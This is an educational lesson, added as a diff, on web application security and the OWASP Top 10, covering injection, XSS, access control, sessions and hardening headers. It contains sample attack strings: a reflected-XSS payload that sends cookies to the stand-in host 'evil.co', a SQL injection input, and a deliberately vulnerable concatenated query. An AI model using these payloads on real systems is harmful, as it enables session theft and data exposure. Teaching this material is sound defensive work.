@@ -1,0 +1,156 @@
+# Web Application Security: Thinking Like an Attacker
+
+> Every input field, URL parameter, and HTTP header is a door an
+> attacker can try. Web security is the discipline of assuming
+> hostile input everywhere and verifying every action — this lesson
+> tours the OWASP Top 10 risks and the defenses that neutralise
+> them.
+
+## 1. The First Law: Never Trust Input
+
+[definition]
+**Injection** (OWASP #3, historically #1) happens when attacker data
+is interpreted as *code*. The classic is **SQL injection**: user
+input concatenated into a query can rewrite the query itself.
+[/definition]
+
+```javascript
+// VULNERABLE — input becomes part of the query:
+db.query(`SELECT * FROM users
+          WHERE name = '${req.query.name}'`);
+// Attacker enters:  ' OR '1'='1'  →  every user returned
+```
+
+```javascript
+// SAFE — parameterised, data stays data:
+db.query("SELECT * FROM users WHERE name = ?", [req.query.name]);
+```
+
+The same principle defends **command injection** (`rm -rf`
+in a shell call), **LDAP/XPath injection**, and header splitting.
+One rule covers them all: **parameterise, never concatenate**.
+
+[important]
+**Defence in depth** — no single fix is trusted alone: prepared
+statements + least-privilege database accounts + input validation +
+error handling that never leaks SQL. If one layer fails, the next
+holds.
+[/important]
+
+## 2. XSS: Script in Your Own Pages
+
+**Cross-Site Scripting (XSS)** injects JavaScript that runs in
+*your* page, in *other users'* browsers — stealing sessions,
+keylogging, defacing.
+
+| Vector | Example payload |
+| --- | --- |
+| Reflected | `?q=<script>fetch('evil.co?c='+document.cookie)</script>` |
+| Stored | A comment saved with `<img onerror=...>` |
+| DOM-based | `element.innerHTML = location.hash.slice(1)` |
+
+**Defences:**
+
+- **Escape output by context** (HTML body vs attribute vs JS vs
+  URL — each has its own encoding). Frameworks (React, Vue) escape
+  by default; the danger is `dangerouslySetInnerHTML` /
+  `v-html` / `.innerHTML`.
+- **Content Security Policy** header — whitelist script sources,
+  ban inline scripts:
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self'
+```
+
+- **HttpOnly cookies** — JavaScript cannot read the session cookie
+  even if XSS slips through.
+
+## 3. Broken Access Control: The Server Must Decide
+
+The server-side check on *every* request is the only one that
+counts — client-side hiding is decoration.
+
+```http
+GET /api/orders/1043        ← whose order?
+```
+
+- **IDOR** (Insecure Direct Object Reference): changing 1043 → 1044
+  reads someone else's data. Defence: verify **ownership** server-
+  side; prefer non-guessable IDs (UUIDs) — but still verify.
+- **Privilege confusion**: a normal user hitting `/admin/delete`.
+  Defence: **deny by default**, check roles per endpoint, re-check
+  on state-changing actions.
+- **Mass assignment**: `updateUser({role: "admin"})` because the API
+  blindly copies every submitted field. Defence: **allow-list**
+  updatable fields.
+
+## 4. Sessions, Tokens, and Auth (Part of OWASP #7)
+
+- Passwords stored with **bcrypt/argon2** (salted, slow) — never
+  MD5/SHA-1, never plaintext.
+- **Session cookies**: `HttpOnly; Secure; SameSite=Lax`.
+- **CSRF** (cross-site request forgery): attacker's page makes your
+  browser fire a state-changing request to a site you're logged
+  into. Defence: `SameSite` cookies + **CSRF tokens** + require
+  re-auth for critical actions. (CSRF tokens do NOT defend against
+  XSS.)
+- **JWTs**: sign them, keep lifetimes short, never store them where
+  XSS can read them if avoidable.
+
+## 5. The Rest of the Top Risks
+
+| Risk | Gist | Core defence |
+| --- | --- | --- |
+| Security misconfiguration | Debug mode on, default creds, directory listing | Harden defaults; config as code; audits |
+| Vulnerable components | Known-CVE library in your dependency tree | Lockfiles, `npm audit`, update promptly |
+| Auth failures | Weak passwords, no rate limit, predictable reset tokens | Rate limiting, lockouts, MFA, secure reset flows |
+| SSRF | Server fetches an attacker-chosen URL (internal metadata endpoints) | Allow-list outbound targets, block link-local IPs |
+| Logging failures | Attacks invisible; alerts absent | Log auth events & failures centrally; alert on anomalies |
+| Crypto failures | Plaintext PII, TLS misconfigured | HTTPS everywhere + HSTS; encrypt sensitive fields |
+| Software/data integrity | Unverified updates, unsigned pipelines | Verify signatures; pin dependencies |
+
+## 6. Security Misconfiguration in Practice
+
+```http
+# Tell the browser exactly what's allowed:
+Content-Security-Policy: default-src 'self'
+Strict-Transport-Security: max-age=63072000; includeSubDomains
+X-Content-Type-Options: nosniff
+Referrer-Policy: strict-origin-when-cross-origin
+```
+
+Five headers, five classes of attack blunted. Also: disable stack
+traces in production (a traceback is a map for the attacker),
+delete unused admin panels, and separate environments.
+
+## 7. A Secure-By-Default Checklist
+
+1. Every DB call parameterised; no string-built queries, ever.
+2. Output escaped by context; CSP set; cookies HttpOnly+Secure+
+   SameSite.
+3. Authorisation checked server-side on every route; ownership
+   verified on every object access.
+4. Passwords hashed with bcrypt/argon2; MFA offered; login rate-
+   limited.
+5. Dependencies pinned and audited; CI fails on known CVEs.
+6. Central logging with alerts; least-privilege service accounts.
+7. Threat-model new features: "what if a hostile user sends this?"
+
+[tip]
+Test your own site with the attacker's toolkit — OWASP ZAP or Burp
+Suite community editions. Watch what happens when you send a quote
+in every field, change IDs in every URL, and replay POSTs — the
+bugs you find in an afternoon are the ones you want fixed before
+an attacker's afternoon.
+[/tip]
+
+[summary]
+Web security starts with zero trust in input: parameterised queries
+kill injection, contextual escaping plus CSP blunts XSS, and
+server-side authorisation (deny by default, verify ownership)
+defeats access-control bugs. Sessions need HttpOnly/Secure/
+SameSite cookies with CSRF tokens; passwords need bcrypt/argon2;
+dependencies need pinning and audits; and everything needs logging.
+Defence in depth, secure defaults, and thinking like an attacker on
+every field — that's the discipline of the OWASP Top 10.
+[/summary]
